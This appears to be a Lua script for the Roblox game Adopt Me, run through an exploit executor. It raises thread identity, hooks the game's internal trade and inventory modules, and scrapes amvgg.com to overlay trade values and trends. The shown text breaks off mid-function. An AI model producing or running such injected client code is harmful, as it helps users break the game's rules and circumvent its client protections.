--==================================================================
-- Adopt Me 거래 가치 오버레이 + 자동 채우기
-- 이미지 크기와 비율 수정
--==================================================================

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")

-- (익스플로잇에 함수가 있는 경우) 스레드 권한 상승 시도
pcall(function() setthreadidentity(2) end)

--==================================================================
-- 게임 내부 모듈 로드 (Adopt Me)
--==================================================================
local load = require(ReplicatedStorage:WaitForChild("Fsys")).load
local KindDB = load("KindDB")
load("ClientData")

local InventoryDB = load("InventoryDB")
local UIManager   = load("UIManager")
local BackpackButtonCreator = load("BackpackButtonCreator")
local BackpackApp = UIManager.apps and UIManager.apps.BackpackApp
local TradeApp    = UIManager.apps.TradeApp
local RouterClient = load("RouterClient")

--==================================================================
-- 문자열 유틸리티
--==================================================================
local function trim(s)
	if not s then return nil end
	return (s:gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", ""))
end

local function stripParens(s)
	if not s then return nil end
	return (s:gsub("%s*%b()", ""):gsub("^%s+", ""):gsub("%s+$", ""))
end

local function cleanName(s) return trim(stripParens(s)) end
local function normalize(s) return s:lower():gsub("_", " ") end
local function alnumKey(s)
	if not s then return nil end
	return s:lower():gsub("[^%w]", "")
end

--==================================================================
-- 가치 평가 모드
--==================================================================
local MODE = {
	current = "baseless",
	order   = { "baseless", "ridepot", "frost" },
	labels  = { baseless = "Baseless", ridepot = "Ridepot", frost = "Frost" }
}

local kindNameById = {}
for _, group in pairs(InventoryDB) do
	if type(group) == "table" then
		for id, entry in pairs(group) do
			if type(entry) == "table" and entry.name then
				kindNameById[id] = trim(entry.name)
			end
		end
	end
end

--==================================================================
-- AMVGG 가격 테이블
--==================================================================
local amvggPetsByExact   = {}
local amvggPetsByLower   = {}
local amvggItemsByExact  = {}
local amvggItemsByLower  = {}
local amvggItemsByAlnum  = {}
local amvggDemandByExact = {}
local amvggDemandByLower = {}
local amvggDemandByAlnum = {}
local kindValueMap       = {}

local POTIONS = {
	{ patterns = { "fly%-a", "fly a" }, amvgg = "Fly-A-Pet Potion", value = 0.012 },
	{ patterns = { "ride%-a", "ride a" }, amvgg = "Ride-A-Pet Potion", value = 0.0065 },
}

local function matchesAny(text, patterns)
	for _, pat in ipairs(patterns) do
		if text:find(pat, 1, false) then return true end
	end
	return false
end

local function lookupItem(name) return amvggItemsByExact[name] or amvggItemsByLower[name:lower()] end

local function findInventoryEntry(id, category)
	if not id then return nil end
	if category and InventoryDB[category] and InventoryDB[category][id] then
		return InventoryDB[category][id]
	end
	for _, group in pairs(InventoryDB) do
		if type(group) == "table" and group[id] then return group[id] end
	end
	return nil
end

local function collectAliases(id, category, offerItem)
	local out, seen = {}, {}
	local function add(raw)
		if raw == nil then return end
		local a = trim(tostring(raw))
		if a and not seen[a] then seen[a] = true; table.insert(out, a) end
		local b = cleanName(a)
		if b and not seen[b] then seen[b] = true; table.insert(out, b) end
	end
	if offerItem then
		add(offerItem.kind)
		if offerItem.id and KindDB[offerItem.id] then
			local k = KindDB[offerItem.id]
			add(k.name); add(k.kind); add(k.display_name)
		end
	end
	if id then
		add(id); add(kindNameById[id])
		local e = findInventoryEntry(id, category)
		if e then add(e.name) end
	end
	return out
end

local function resolveKind(offerItem)
	if not offerItem then return nil end
	local kind = offerItem.kind
	if not kind and offerItem.id and KindDB[offerItem.id] then
		local k = KindDB[offerItem.id]
		kind = k.name or k.kind
	end
	return kind
end

local function findPetEntry(id)
	if not id then return nil end
	local name = kindNameById[id]
	if name then
		local hit = amvggPetsByExact[name] or amvggPetsByLower[name:lower()]
		if hit then return hit end
	end
	local t = trim(id)
	if t then
		local hit = amvggPetsByExact[t] or amvggPetsByLower[t:lower()]
		if hit then return hit end
	end
	return amvggPetsByLower[normalize(id)]
end

local function findItemEntry(name)
	if not name then return nil end
	for _, candidate in ipairs({ trim(name), cleanName(name) }) do
		if candidate then
			local hit = amvggItemsByExact[candidate] or amvggItemsByLower[candidate:lower()]
			if hit then return hit end
			local key = alnumKey(candidate)
			if key and amvggItemsByAlnum[key] then return amvggItemsByAlnum[key] end
		end
	end
	local c = cleanName(name)
	if c then
		local lower = c:lower()
		local best, bestLen = nil, 0
		for key, item in pairs(amvggItemsByLower) do
			if lower:sub(1, #key) == key and bestLen < #key then
				best = item; bestLen = #key
			end
		end
		if best then return best end
	end
	return nil
end

local function findByName(name)
	if not name then return nil end
	local lower = name:lower()
	for _, potion in ipairs(POTIONS) do
		if matchesAny(lower, potion.patterns) then
			local hit = lookupItem(potion.amvgg)
			if hit then return hit end
			if potion.value then return { name = potion.amvgg, value = tostring(potion.value) } end
		end
	end
	return findItemEntry(name)
end

local function findValueEntry(id, category, offerItem)
	local kind = (offerItem and offerItem.kind) or id
	if kind and kindValueMap[kind] then return kindValueMap[kind] end
	if id and kindValueMap[id] then return kindValueMap[id] end
	for _, alias in ipairs(collectAliases(id, category, offerItem)) do
		local hit = findByName(alias)
		if hit then return hit end
	end
	if id then
		local hit = findByName(id)
		if hit then return hit end
	end
	return amvggItemsByLower[normalize(id or "")]
end

local function mapFoodPotions()
	local food = InventoryDB.food or {}
	for id, entry in pairs(food) do
		if type(entry) == "table" and entry.name then
			local lower = entry.name:lower()
			for _, potion in ipairs(POTIONS) do
				if matchesAny(lower, potion.patterns) then
					local hit = lookupItem(potion.amvgg)
					if not hit and potion.value then
						hit = { name = potion.amvgg, value = tostring(potion.value) }
					end
					if hit then kindValueMap[id] = hit end
					break
				end
			end
		end
	end
end

local function rebuildKindValueMap()
	for k in pairs(kindValueMap) do kindValueMap[k] = nil end
	for category, group in pairs(InventoryDB) do
		if category ~= "pets" and type(group) == "table" then
			for id, entry in pairs(group) do
				if type(entry) == "table" and entry.name then
					local hit = findByName(entry.name)
					if hit then kindValueMap[id] = hit end
				end
			end
		end
	end
	mapFoodPotions()
end

--==================================================================
-- 펫 수요도 (AMVGG) -> 별 0~3개
--==================================================================
do
	local D = {}
	MODE.Demand = D
	D.MAX = 3     -- 최대 별 개수 (AMVGG 기준 3개)
	D.scale = nil -- 사이트 수요도 숫자 척도의 최댓값 (자동 감지)

	local WORDS = {
		["very low"] = 1, ["terrible"] = 1, ["awful"] = 1, ["low"] = 1, ["poor"] = 1,
		["mid"] = 2, ["medium"] = 2, ["average"] = 2, ["ok"] = 2, ["okay"] = 2, ["normal"] = 2,
		["high"] = 3, ["good"] = 3, ["very high"] = 3, ["amazing"] = 3, ["excellent"] = 3, ["extreme"] = 3, ["best"] = 3,
	}

	local function asNumber(v)
		if type(v) == "number" then return v end
		if type(v) == "string" then return tonumber(v) end
		return nil
	end

	-- 펫 객체에서 원시 수요도 값 추출
	local HINTS = { "demand", "star", "popular", "hype", "trend" }
	local function unwrap(v)
		if type(v) == "table" then
			for _, k in ipairs({ "value", "level", "rating", "stars", "score", "name", "label" }) do
				if v[k] ~= nil then return unwrap(v[k]) end
			end
			return nil
		end
		if type(v) == "number" or (type(v) == "string" and v ~= "") then return v end
		return nil
	end

	function D.raw(pet)
		if type(pet) ~= "table" then return nil end
		local direct = unwrap(pet.demand) or unwrap(pet.Demand)
		if direct ~= nil then return direct end
		for _, hint in ipairs(HINTS) do -- demandLevel, demand_rating, stars, popularity...
			for k, val in pairs(pet) do
				if type(k) == "string" and k:lower():find(hint, 1, true) then
					local u = unwrap(val)
					if u ~= nil then return u end
				end
			end
		end
		return nil
	end

	-- 로드된 모든 펫을 기준으로 척도(5, 10 또는 사용자 지정) 판별
	function D.calibrate(list)
		local mx = 0
		for _, p in ipairs(list) do
			local n = asNumber(D.raw(p))
			if n and n > mx then mx = n end
		end
		D.scale = (mx <= 3 and 3) or (mx <= 5 and 5) or (mx <= 10 and 10) or mx
		return mx
	end

	-- 별 개수 0~5 반환. 수요도 정보가 없으면 nil 반환
	function D.stars(pet)
		local v = D.raw(pet)
		if v == nil then return nil end
		local n = asNumber(v)
		if n then
			return math.clamp(math.floor(n / (D.scale or D.MAX) * D.MAX + 0.5), 0, D.MAX)
		end
		if type(v) == "string" then
			local s = v:lower():gsub("_", " "):gsub("%s+", " ")
			s = s:gsub("^%s+", ""):gsub("%s+$", "")
			local a, b = s:match("^([%d%.]+)%s*/%s*([%d%.]+)$") -- "7/10" 형식
			if a and tonumber(a) and tonumber(b) and tonumber(b) > 0 then
				return math.clamp(math.floor(tonumber(a) / tonumber(b) * D.MAX + 0.5), 0, D.MAX)
			end
			if WORDS[s] then return WORDS[s] end
		end
		return nil
	end

	function D.text(stars)
		return string.format(
			'<font color="rgb(255,200,40)">%s</font><font color="rgb(110,110,110)">%s</font>',
			string.rep("★", stars), string.rep("★", D.MAX - stars)
		)
	end
end


local function registerItem(item)
	local name = trim(item.name)
	if not name then return end
	amvggItemsByExact[name] = item
	amvggItemsByLower[name:lower()] = item
	local key = alnumKey(name)
	if key then amvggItemsByAlnum[key] = item end
end

local function roundTo(x, digits)
	local m = 10 ^ digits
	return math.floor(x * m + 0.5) / m
end

--==================================================================
-- AMVGG 계수 테이블
--==================================================================
local data = HttpService:JSONDecode([[
{
 "0":{"NP":0.08,"R":0.5,"F":0.6,"NNP":0.21,"NR":0.6,"NF":0.75,"MNP":0.45,"MR":0.65,"MF":0.775},
 "1":{"NP":0.08,"R":0.5,"F":0.6,"NNP":0.35,"NR":0.725,"NF":0.79,"MNP":0.55,"MR":0.675,"MF":0.8},
 "2":{"NP":0.1,"R":0.525,"F":0.625,"NNP":0.425,"NR":0.75,"NF":0.8,"MNP":0.65,"MR":0.75,"MF":0.81},
 "3":{"NP":0.125,"R":0.6,"F":0.65,"NNP":0.55,"NR":0.8,"NF":0.81,"MNP":0.725,"MR":0.8,"MF":0.85},
 "4":{"NP":0.166,"R":0.65,"F":0.7,"NNP":0.625,"NR":0.81,"NF":0.82,"MNP":0.75,"MR":0.825,"MF":0.86},
 "5":{"NP":0.2,"R":0.675,"F":0.725,"NNP":0.675,"NR":0.82,"NF":0.83,"MNP":0.775,"MR":0.85,"MF":0.89},
 "6":{"NP":0.3,"R":0.7,"F":0.75,"NNP":0.725,"NR":0.85,"NF":0.87,"MNP":0.825,"MR":0.9,"MF":0.925},
 "7":{"NP":0.45,"R":0.725,"F":0.775,"NNP":0.75,"NR":0.9,"NF":0.91,"MNP":0.85,"MR":0.92,"MF":0.95},
 "8":{"NP":0.55,"R":0.75,"F":0.8,"NNP":0.77,"NR":0.9,"NF":0.915,"MNP":0.875,"MR":0.93,"MF":0.96},
 "9":{"NP":0.65,"R":0.825,"F":0.85,"NNP":0.85,"NR":0.925,"NF":0.94,"MNP":0.925,"MR":0.95,"MF":0.975},
 "10":{"NP":0.8,"R":0.9,"F":0.92,"NNP":0.925,"NR":0.96,"NF":0.97,"MNP":1.05,"MR":0.98,"MF":0.99},
 "11":{"NP":0.9,"R":0.95,"F":0.975,"NNP":1,"NR":0.98,"NF":0.985,"MNP":1.05,"MR":1,"MF":1},
 "12":{"NP":0.9,"R":0.95,"F":0.975,"NNP":1.03,"NR":0.98,"NF":0.985,"MNP":1.1,"MR":1,"MF":1},
 "21":{"NP":0.75,"R":0.86,"F":0.875,"NNP":0.88,"NR":0.93,"NF":0.95,"MNP":1,"MR":0.98,"MF":0.99},
 "22":{"NP":0.75,"R":0.86,"F":0.875,"NNP":0.88,"NR":0.93,"NF":0.95,"MNP":0.97,"MR":0.98,"MF":0.99},
 "23":{"NP":0.7,"R":0.8,"F":0.85,"NNP":0.85,"NR":0.9,"NF":0.93,"MNP":0.95,"MR":0.965,"MF":0.985},
 "33":{"NP":0.15,"R":0.6,"F":0.65,"NNP":0.375,"NR":0.75,"NF":0.8,"MNP":0.5,"MR":0.7,"MF":0.8},
 "44":{"NP":0.97,"R":0.98,"F":0.985,"NNP":1,"NR":1,"NF":1,"MNP":1.025,"MR":1,"MF":1},
 "45":{"NP":0.97,"R":0.98,"F":0.985,"NNP":1,"NR":1,"NF":1,"MNP":1,"MR":1,"MF":1},
 "46":{"NP":0.98,"R":0.985,"F":0.99,"NNP":1,"NR":1,"NF":1,"MNP":1,"MR":1,"MF":1},
 "47":{"NP":0.98,"R":0.985,"F":0.99,"NNP":1,"NR":1,"NF":1,"MNP":1.05,"MR":1,"MF":1},
 "48":{"NP":0.985,"R":0.99,"F":0.995,"NNP":1,"NR":1,"NF":1,"MNP":1,"MR":1,"MF":1},
 "49":{"NP":0.985,"R":0.99,"F":0.995,"NNP":1,"NR":1,"NF":1,"MNP":1.05,"MR":1,"MF":1},
 "50":{"NP":0.985,"R":0.99,"F":0.995,"NNP":1,"NR":1,"NF":1,"MNP":1.025,"MR":1,"MF":1},
 "55":{"NP":0.9,"R":0.95,"F":0.975,"NNP":1,"NR":0.98,"NF":0.985,"MNP":1.075,"MR":1,"MF":1},
 "66":{"NP":0.9,"R":0.95,"F":0.975,"NNP":1,"NR":0.98,"NF":0.985,"MNP":1.125,"MR":1,"MF":1},
 "69":{"NP":0.9,"R":0.95,"F":0.975,"NNP":0.96,"NR":0.98,"NF":0.985,"MNP":1,"MR":1,"MF":1},
 "79":{"NP":0.97,"R":0.98,"F":0.985,"NNP":1,"NR":1,"NF":1,"MNP":1.05,"MR":1,"MF":1},
 "81":{"NP":0.98,"R":0.985,"F":0.99,"NNP":1,"NR":1,"NF":1,"MNP":1.025,"MR":1,"MF":1},
 "99":{"NP":0.8,"R":0.9,"F":0.92,"NNP":0.95,"NR":0.975,"NF":0.98,"MNP":1,"MR":1,"MF":1},
 "111":{"NP":0.04,"R":0.5,"F":0.6,"NNP":0.125,"NR":0.6,"NF":0.75,"MNP":0.33,"MR":0.65,"MF":0.75},
 "222":{"NP":0.02,"R":0.45,"F":0.55,"NNP":0.07,"NR":0.5,"NF":0.65,"MNP":0.275,"MR":0.55,"MF":0.65},
 "333":{"NP":0.03,"R":0.5,"F":0.6,"NNP":0.1,"NR":0.55,"NF":0.7,"MNP":0.3,"MR":0.6,"MF":0.7}
}
]])

local SUFFIX_TO_FIELD = {
	fr  = "regularValue", r  = "rValue", f  = "fValue", [""]  = "npRegularValue",
	nfr = "neonValue",    nr = "nrValue", nf = "nfValue", n  = "npNeonValue",
	mfr = "megaValue",    mr = "mrValue", mf = "mfValue", m  = "npMegaValue",
}
local SUFFIX_TO_COL = {
	fr  = "regular", r  = "R",  f  = "F",  [""]  = "NP",
	nfr = "neon",    nr = "NR", nf = "NF", n  = "NNP",
	mfr = "mega",    mr = "MR", mf = "MF", m  = "MNP",
}

local function calcCategoryValues(pet)
	local catId = tonumber(pet.category)
	if not catId or catId == 13 then return nil end
	local coef = data[tostring(catId)]
	if not coef then return nil end
	local reg = tonumber(pet.regularValue) or 0
	local neo = tonumber(pet.neonValue)    or 0
	local meg = tonumber(pet.megaValue)    or 0
	local digits = reg >= 0.0175 and 3 or 4

	if catId == 11 and reg > 0.08 then
		local out = {
			NP = roundTo(0.95 * reg, digits), R  = roundTo(0.975 * reg, digits), F  = roundTo(0.975 * reg, digits),
			NNP = roundTo(neo * coef.NNP, 4), NR  = neo > 0.2 and neo or roundTo(neo * coef.NR, 4),
			NF  = neo > 0.2 and neo or roundTo(neo * coef.NF, 4),
		}
		out.MNP = roundTo(meg * coef.MNP, 4)
		out.MR  = meg > 0.9 and meg or roundTo(meg * coef.MR, 4)
		out.MF  = meg > 0.9 and meg or roundTo(meg * coef.MF, 4)
		return out
	end
	return {
		NP  = roundTo(reg * coef.NP,  digits), R   = roundTo(reg * coef.R,   digits), F   = roundTo(reg * coef.F,   digits),
		NNP = roundTo(neo * coef.NNP, 4), NR  = roundTo(neo * coef.NR,  4), NF  = roundTo(neo * coef.NF,  4),
		MNP = roundTo(meg * coef.MNP, 4), MR  = roundTo(meg * coef.MR,  4), MF  = roundTo(meg * coef.MF,  4),
	}
end

local function petSuffix(props)
	local s = (props.flyable == true and "f" or "") .. (props.rideable == true and "r" or "")
	if props.mega_neon == true then return "m" .. s end
	if props.neon      == true then return "n" .. s end
	return s
end

local function getPetPrice(pet, suffix)
	if tonumber(pet.category) == 13 then
		local field = SUFFIX_TO_FIELD[suffix]
		return field and tonumber(pet[field]) or nil
	end
	local calc = calcCategoryValues(pet)
	if not calc then
		if suffix == "r" or suffix == "nr" then
			local alt = suffix:gsub("r", "f")
			if alt == "f"  then return tonumber(pet.regularValue) or 0 end
			if alt == "nf" then return tonumber(pet.neonValue)    end
		end
		if suffix == "nfr" then return tonumber(pet.neonValue)  end
		if suffix == "mfr" then return tonumber(pet.megaValue)  end
		if suffix == "fr"  then return tonumber(pet.regularValue) end
		return nil
	end
	local col = SUFFIX_TO_COL[suffix]
	if col == "regular" then return tonumber(pet.regularValue) end
	if col == "neon"    then return tonumber(pet.neonValue)    end
	if col == "mega"    then return tonumber(pet.megaValue)    end
	local v = calc[col]
	if (v == 0 or v == nil) and (suffix == "r" or suffix == "nr") then
		local altCol = SUFFIX_TO_COL[suffix:gsub("r", "f")]
		if altCol then
			local altV = calc[altCol]
			if altV and altV > 0 then return altV end
		end
	end
	return v or 0
end

local function smartRound(x)
	local a = math.abs(x)
	local digits = a >= 100 and 0 or a >= 10 and 1 or a >= 1 and 2 or a >= 0.1 and 3 or 4
	local m = 10 ^ digits
	return math.floor(x * m + 0.5) / m
end

local function frostConvert(x) return smartRound(0.66666666666666663 * x) end
local function ridepotConvert(x) return math.floor(math.floor(154 * x * 20 + 0.5) / 20 * 100 + 0.5) / 100 end

--==================================================================
-- AMVGG.COM 데이터 파싱
--==================================================================
local function extractJsonArray(body, key)
	local s = body:gsub("\\u0026", "&"):gsub("\\\"", "\"")
	local needle = "\"" .. key .. "\":"
	local pos = s:find(needle .. "%[")
	if not pos then return nil end
	local startIdx = pos + #needle
	local depth, endIdx = 0, startIdx
	local inStr, esc = false, false
	for i = startIdx, math.min(startIdx + 4000000, #s) do
		local ch = s:sub(i, i)
		if not inStr then
			if ch == "\"" then inStr = true
			elseif ch == "[" then depth += 1
			elseif ch == "]" then depth -= 1 end
		elseif esc then esc = false
		elseif ch == "\\" then esc = true
		elseif ch == "\"" then inStr = false end
		if depth == 0 and i > startIdx then endIdx = i; break end
	end
	local payload = s:sub(startIdx, endIdx)
	local ok, res = pcall(HttpService.JSONDecode, HttpService, payload)
	return ok and res or nil
end

local function httpGetArray(url, key)
	local ok, res = pcall(function()
		return request({
			Url = url, Method = "GET",
			Headers = { Accept = "text/html", ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" }
		})
	end)
	if ok and res and res.Success then return extractJsonArray(res.Body, key) end
	return nil
end

--==================================================================
-- 펫 추세 (amvgg.com/value-updates): 상승 / 하락 / 안정
--==================================================================
local HOOKS = {}
local TREND = {
	URL = "https://amvgg.com/value-updates",
	API_URL = nil,        -- 직접 API 주소를 찾으면 (DevTools -> Network) 여기에 문자열로 입력
	WINDOW_DAYS = 14,     -- 변경 후 펫을 '상승/하락'으로 판단할 기간(일)
	STABLE_OLD_DAYS = 7,  -- 이 기간보다 오래 안정적이면 회색 화살표, 짧으면 주황색 화살표
	REFRESH_EVERY = 600,  -- 새로고침 간격(초)
	FILE = "AdoptMeOverlay_trend.json",
	remote = {}, localRec = {}, oldest = nil, started = false,
	stamp = {}, dir = {}, cache = {}, queue = {}, queued = {}, CACHE_FILE = "AdoptMe_trend_cache.json",
}

local UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
local TIME_KEYS = { "createdAt", "created_at", "updatedAt", "updated_at", "date", "timestamp", "time", "changedAt", "changed_at", "lastUpdated", "at" }
local NAME_KEYS = { "name", "petName", "pet_name", "itemName", "item_name", "item", "pet", "title" }
local DIR_KEYS  = { "direction", "trend", "change", "changeType", "type", "status", "diff", "delta", "difference" }
local OLD_KEYS  = { "oldValue", "previousValue", "prevValue", "old", "prev", "from", "before" }
local NEW_KEYS  = { "newValue", "currentValue", "new", "to", "after", "value" }

local function pick(t, keys)
	for _, k in ipairs(keys) do if t[k] ~= nil then return t[k] end end
	return nil
end

local function parseTime(v)
	if type(v) == "number" then
		if v > 1e12 then v = v / 1000 end
		return v
	end
	if type(v) == "string" then
		local n = tonumber(v); if n then return parseTime(n) end
		local y, mo, d, h, mi, s = v:match("(%d+)-(%d+)-(%d+)[T ](%d+):(%d+):?(%d*)")
		if y then
			return os.time({ year = tonumber(y), month = tonumber(mo), day = tonumber(d), hour = tonumber(h), min = tonumber(mi), sec = tonumber(s) or 0 })
		end
		local y2, mo2, d2 = v:match("(%d+)-(%d+)-(%d+)")
		if y2 then return os.time({ year = tonumber(y2), month = tonumber(mo2), day = tonumber(d2), hour = 12 }) end
	end
	return nil
end

local function dirFrom(v)
	if type(v) == "number" then return (v > 0 and "up") or (v < 0 and "down") or nil end
	if type(v) == "string" then
		local s = v:lower()
		if s:find("%f[%a]up%f[%A]") or s:find("increas") or s:find("rise") or s:find("grow") or s:find("raise") then return "up" end
		if s:find("%f[%a]down%f[%A]") or s:find("decreas") or s:find("drop") or s:find("fall") or s:find("lower") then return "down" end
		local n = tonumber(s:match("^%s*([%+%-]?[%d%.]+)"))
		if n then return (n > 0 and "up") or (n < 0 and "down") or nil end
	end
	return nil
end

local function entryDir(e)
	for _, k in ipairs(DIR_KEYS) do
		if e[k] ~= nil then local d = dirFrom(e[k]); if d then return d end end
	end
	local old, new = tonumber(pick(e, OLD_KEYS)), tonumber(pick(e, NEW_KEYS))
	if old and new then return (new > old and "up") or (new < old and "down") or nil end
	return nil
end

local function collect(e, inheritedTime, out, depth)
	if type(e) ~= "table" or depth > 4 then return end
	if #e > 0 then
		for _, child in ipairs(e) do collect(child, inheritedTime, out, depth + 1) end
		return
	end
	local t = parseTime(pick(e, TIME_KEYS)) or inheritedTime
	local nameV = pick(e, NAME_KEYS)
	if type(nameV) == "table" then nameV = pick(nameV, NAME_KEYS) end
	if type(nameV) == "string" then
		local d = entryDir(e)
		if d and t then table.insert(out, { name = nameV, dir = d, time = t }) end
	end
	for _, v in pairs(e) do
		if type(v) == "table" then collect(v, t, out, depth + 1) end
	end
end

local function httpGetBody(url, accept)
	local ok, res = pcall(function()
		return request({ Url = url, Method = "GET", Headers = { Accept = accept or "text/html", ["User-Agent"] = UA } })
	end)
	if ok and res and res.Success then return res.Body end
	return nil
end

local function parseUpdates(body)
	local out = {}
	-- 1) 응답 본문이 순수 JSON인 경우 (API)
	local okJ, decoded = pcall(HttpService.JSONDecode, HttpService, body)
	if okJ and type(decoded) == "table" then collect(decoded, nil, out, 0) end
	if #out > 0 then return out end
	-- 2) 페이지 HTML에 포함된 JSON (Next.js)
	for _, key in ipairs({ "updates", "valueUpdates", "value_updates", "changes", "history", "data", "items", "logs", "entries" }) do
		local arr = extractJsonArray(body, key)
		if arr then
			collect(arr, nil, out, 0)
			if #out > 0 then return out end
		end
	end
	return out
end

local function dbg(text)
	pcall(function()
		if writefile then
			local old = ""
			if isfile and isfile("AdoptMe_trend_debug.txt") then old = readfile("AdoptMe_trend_debug.txt") end
			if #old > 60000 then old = "" end
			writefile("AdoptMe_trend_debug.txt", old .. text .. "\n")
		end
	end)
end

local function tryParse(url, accept, label)
	local body = httpGetBody(url, accept)
	if not body then dbg("[fail] " .. url); return nil, nil end
	local list = parseUpdates(body)
	dbg(string.format("[%s] %s len=%d parsed=%d\n%s\n-----", label or "try", url, #body, #list, body:sub(1, 700)))
	return list, body
end

-- 사이트의 JS 파일(Next.js)에서 API 주소를 찾아 하나씩 시도
local function discoverApis(html)
	local cands, seen = {}, {}
	local function add(u)
		if u and not seen[u] and not u:find("%.js$") and not u:find("%.css$") and not u:find("%.png$") and not u:find("%.webp$") then
			seen[u] = true; table.insert(cands, u)
		end
	end
	local chunks, cseen = {}, {}
	for path in html:gmatch("/_next/static/[^\"'%s\\<>]+%.js") do
		if not cseen[path] then cseen[path] = true; table.insert(chunks, path) end
	end
	local scan = { html }
	for i = 1, math.min(#chunks, 30) do
		local js = httpGetBody("https://amvgg.com" .. chunks[i], "*/*")
		if js then table.insert(scan, js) end
		task.wait()
	end
	for _, text in ipairs(scan) do
		for u in text:gmatch("https?://[%w%.%-]+/[%w_%-%./%?=&%%]*") do
			local l = u:lower()
			if l:find("api") or l:find("update") or l:find("change") or l:find("history") or l:find("trend") then add(u) end
		end
		for path in text:gmatch("[\"'`](/api/[%w_%-%./%?=&%%]*)[\"'`]") do add("https://amvgg.com" .. path) end
		for path in text:gmatch("[\"'`](/[%w_%-%./]*[uU]pdate[%w_%-%./]*)[\"'`]") do add("https://amvgg.com" .. path) end
	end
	return cands
end

function TREND.fetchRemote()
	local list, html = {}, nil
	local winner
	if TREND.API_URL then
		list = tryParse(TREND.API_URL, "application/json", "api") or {}
		if #list > 0 then winner = TREND.API_URL end
	end
	if #list == 0 and TREND.found then
		list = tryParse(TREND.found, "application/json", "cached") or {}
		if #list > 0 then winner = TREND.found end
	end
	if #list == 0 then
		local l2, body = tryParse(TREND.URL, "text/html", "page")
		html = body
		if l2 and #l2 > 0 then list = l2; winner = TREND.URL end
	end
	if #list == 0 and html then
		local cands = discoverApis(html)
		print("[trend] API 후보 발견: " .. #cands)
		for i, u in ipairs(cands) do if i <= 40 then print("[trend]   " .. u) end end
		dbg("CANDIDATES:\n" .. table.concat(cands, "\n"))
		for i, u in ipairs(cands) do
			if i > 40 then break end
			local l3 = tryParse(u, "application/json", "cand")
			if l3 and #l3 > 0 then list = l3; winner = u; TREND.found = u; break end
		end
	end
	if #list == 0 then
		TREND.remote, TREND.oldest = {}, nil
		warn("[trend] AMVGG에서 상태 정보를 가져오지 못했습니다. 임의의 정보를 표시하지 않습니다. workspace 폴더의 AdoptMe_trend_debug.txt 파일 또는 콘솔 출력을 보내 주세요.")
		return 0
	end
	table.sort(list, function(a, b) return a.time > b.time end)
	local remote, oldest = {}, nil
	for _, u in ipairs(list) do
		local key = alnumKey(u.name)
		if key and not remote[key] then remote[key] = { dir = u.dir, time = u.time } end
		if not oldest or u.time < oldest then oldest = u.time end
	end
	TREND.remote, TREND.oldest = remote, oldest
	local n = 0; for _ in pairs(remote) do n += 1 end
	print("[trend] 출처: " .. tostring(winner) .. " | 항목 수: " .. #list .. " | 아이템 수: " .. n)
	for i = 1, math.min(5, #list) do
		print(string.format("[trend]   %s -> %s (%d시간 전)", list[i].name, list[i].dir, math.floor((os.time() - list[i].time) / 3600)))
	end
	return n
end

local function petTotal(p)
	return (tonumber(p.regularValue) or 0) + (tonumber(p.neonValue) or 0) + (tonumber(p.megaValue) or 0)
end

-- 실제 방향: 이전 실행 시 저장된 값(익스플로잇 파일)과 현재 실제 값을 비교
function TREND.trackLocal()
	local now = os.time()
	local saved = {}
	pcall(function()
		if isfile and readfile and isfile(TREND.FILE) then saved = HttpService:JSONDecode(readfile(TREND.FILE)) end
	end)
	local out = {}
	for lname, p in pairs(amvggPetsByLower) do
		local key = alnumKey(lname)
		local tot = petTotal(p)
		local rec = type(saved) == "table" and saved[key] or nil
		if type(rec) == "table" and rec.tot then
			if math.abs(rec.tot - tot) > 1e-9 then
				rec = { tot = tot, dir = (tot > rec.tot) and "up" or "down", since = now }
			end
		else
			rec = { tot = tot }
		end
		out[key] = rec
	end
	TREND.localRec = out
	pcall(function() if writefile then writefile(TREND.FILE, HttpService:JSONEncode(out)) end end)
end

-- 펫 데이터에서 마지막 업데이트 시간 가져오기 (amvgg /values/pets)
function TREND.harvestStamps()
	local n, sample = 0, nil
	for lname, p in pairs(amvggPetsByLower) do
		if not sample then
			local ks = {}
			for k in pairs(p) do table.insert(ks, tostring(k)) end
			table.sort(ks); sample = table.concat(ks, ",")
		end
		local best
		for k, v in pairs(p) do
			if type(k) == "string" then
				local kl = k:lower()
				if kl:find("updat") or kl:find("modif") or kl:find("changed") then
					local t = parseTime(v)
					if t and t > 1400000000 and (not best or t > best) then best = t end
				end
			end
		end
		if best then TREND.stamp[alnumKey(lname)] = best; n += 1 end
	end
	print("[trend] 데이터의 펫 필드: " .. tostring(sample))
	print("[trend] 펫 업데이트 시간 발견 수: " .. n)
	dbg("PET FIELDS: " .. tostring(sample) .. " stamps=" .. n)
	return n
end

-- amvgg.com/trending 페이지의 방향(상승/하락) (서버에서 렌더링)
function TREND.fetchTrending()
	local body = httpGetBody("https://amvgg.com/trending", "text/html")
	if not body then print("[trend] /trending 페이지에 접근할 수 없습니다"); return 0 end
	local dirs, n = {}, 0
	for kindPath, slug, inner in body:gmatch('<a[^>]-href="/(%a+)/([^"]+)"[^>]*>(.-)</a>') do
		local text = (inner:gsub("<[^>]+>", " "))
		local pct = text:match("([%+%-]%d+%.?%d*)%%")
		if pct then
			local name = slug:gsub("%%(%x%x)", function(h) return string.char(tonumber(h, 16)) end):gsub("_", " ")
			local key = alnumKey(name)
			if key then dirs[key] = (tonumber(pct) or 0) > 0 and "up" or "down"; n += 1 end
		end
	end
	TREND.dir = dirs
	print("[trend] /trending 기준 상승/하락: " .. n .. "개 아이템")
	dbg("TRENDING parsed=" .. n .. " len=" .. #body)
	return n
end

local UNIT_SECS = { second = 1, sec = 1, minute = 60, min = 60, hour = 3600, day = 86400, week = 604800, month = 2592000, year = 31536000 }

-- 대체 방법: 펫 페이지에서 "Last updated: 14 hours ago" 정보 가져오기
function TREND.fetchPage(job)
	local url = "https://amvgg.com/pet/" .. (job.name:gsub(" ", "_"))
	local body = httpGetBody(url, "text/html")
	local now = os.time()
	local stamp = false
	if body then
		local text = body:gsub("<!%-%-.-%-%->", ""):gsub("<[^>]+>", " "):gsub("%s+", " ")
		local ago = text:match("Last updated:?%s*(.-) ago")
		if ago then
